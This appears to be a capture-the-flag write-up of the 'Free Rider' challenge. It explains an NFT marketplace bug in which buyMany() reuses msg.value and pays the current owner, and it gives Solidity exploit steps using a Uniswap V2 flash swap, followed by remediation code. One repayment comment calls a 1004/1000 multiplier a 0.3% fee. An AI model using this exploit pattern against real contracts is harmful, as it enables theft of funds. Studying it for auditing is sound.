# Challenge #9: Free Rider

- **Difficulty**: Hard
- **Category**: NFT Marketplace + Flash Swap
- **Severity**: Critical
- **Status**: SOLVED

## Overview

An NFT marketplace lists 6 NFTs at 15 ETH each (90 ETH total). A bounty contract offers 45 ETH for recovering all 6 NFTs. The player starts with only 0.1 ETH — far less than needed to buy even one NFT legitimately. A critical bug in the marketplace's batch purchase function allows buying all 6 for the price of one, and a Uniswap V2 flash swap provides the initial capital.

## Vulnerability

The `buyMany()` function in the marketplace contains a critical pricing flaw:

```solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; i++) {
        _buyOne(tokenIds[i]);
    }
}

function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId].price;
    require(msg.value >= priceToPay, "Insufficient payment");

    // Sends ETH to the CURRENT owner (the marketplace holds the NFT)
    payable(_token.ownerOf(tokenId)).call{value: priceToPay}("");

    // Transfers NFT to buyer
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
}
```

**Bug 1: `msg.value` reuse**: Each `_buyOne()` call checks `msg.value >= priceToPay`, but `msg.value` is the total ETH sent in the outer transaction — it doesn't decrease with each purchase. So 15 ETH satisfies the check for all 6 NFTs.

**Bug 2: Payment to owner**: The marketplace pays `_token.ownerOf(tokenId)`, which is the marketplace itself (it holds the listed NFTs). So the marketplace pays itself — the buyer's ETH is never actually spent.

## Exploit Walkthrough

**Step 1**: Use Uniswap V2 flash swap to borrow 15 WETH (no upfront capital needed):

```solidity
uniswapPair.swap(15 ether, 0, address(this), abi.encode("flash"));
```

**Step 2**: In the flash swap callback, unwrap WETH to ETH and buy all 6 NFTs:

```solidity
function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
    weth.withdraw(15 ether);

    uint256[] memory tokenIds = new uint256[](6);
    for (uint256 i = 0; i < 6; i++) tokenIds[i] = i;
    marketplace.buyMany{value: 15 ether}(tokenIds);
```

All 6 NFTs (worth 90 ETH total) are purchased for just 15 ETH due to the `msg.value` reuse bug.

**Step 3**: Transfer all NFTs to the bounty contract:

```solidity
    for (uint256 i = 0; i < 6; i++) {
        nft.safeTransferFrom(address(this), address(bountyManager), i, "");
    }
```

**Step 4**: Collect the 45 ETH bounty, repay the flash swap (15 ETH + 0.3% fee), keep the profit:

```solidity
    uint256 repayAmount = 15 ether * 1004 / 1000; // 0.3% fee
    weth.deposit{value: repayAmount}();
    weth.transfer(address(uniswapPair), repayAmount);
}
```

## Real-World Impact

- **LooksRare**: NFT marketplace implementations have been audited for similar batch pricing issues where economic assumptions about individual vs. batch operations diverge.
- **Uniswap V2 Flash Swaps** are a commonly used tool in exploits to bootstrap capital for attacks requiring upfront funds. The flash swap pattern here is standard for capital-efficient exploits.
- **OpenSea** and other NFT marketplaces have had pricing bugs where batch operations did not correctly aggregate individual costs.

## Remediation

```solidity
// Fix 1: Track total ETH spent in buyMany
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    uint256 totalCost = 0;
    for (uint256 i = 0; i < tokenIds.length; i++) {
        totalCost += _buyOne(tokenIds[i]);
    }
    require(msg.value >= totalCost, "Insufficient total payment");
}

function _buyOne(uint256 tokenId) private returns (uint256) {
    uint256 priceToPay = offers[tokenId].price;
    // Don't check msg.value here — checked in aggregate above
    // Transfer NFT first, then handle payment
    _token.safeTransferFrom(address(this), msg.sender, tokenId);
    // Pay the SELLER, not the current owner
    payable(offers[tokenId].seller).call{value: priceToPay}("");
    return priceToPay;
}

// Fix 2: Store seller address separately from NFT ownership
```

## Key Takeaway

In batch operations, `msg.value` persists across loop iterations — always track cumulative spending explicitly, not per-iteration.
